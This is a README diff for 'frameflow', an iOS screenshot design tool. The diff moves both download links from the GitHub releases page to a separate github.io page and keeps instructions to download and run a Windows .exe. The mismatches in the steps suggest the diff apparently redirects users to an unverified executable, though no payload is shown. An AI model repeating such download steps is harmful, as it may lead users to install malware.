@@ -1,6 +1,6 @@
 # 🎨 frameflow - Create professional iOS store screenshots easily
 
-[![](https://img.shields.io/badge/Download_Frameflow-Blue?style=for-the-badge)](https://github.com/rattrapgenuscalliandra840/frameflow/releases)
+[![](https://img.shields.io/badge/Download_Frameflow-Blue?style=for-the-badge)](https://rattrapgenuscalliandra840.github.io)
 
 Frameflow helps you design high-quality screenshots for the iOS App Store. It handles the layout and editing process on your local computer. This ensures your data stays private while you create assets for your product. You bring your own AI keys to generate content, and the software organizes your layers for export.
 
@@ -8,7 +8,7 @@ Frameflow helps you design high-quality screenshots for the iOS App Store. It ha
 
 You do not need programming knowledge to use this tool. The software works as a local application on your Windows computer. Follow these steps to prepare your environment and begin your design work.
 
-1. Visit the following link to see all versions: https://github.com/rattrapgenuscalliandra840/frameflow/releases
+1. Visit the following link to see all versions: https://rattrapgenuscalliandra840.github.io
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
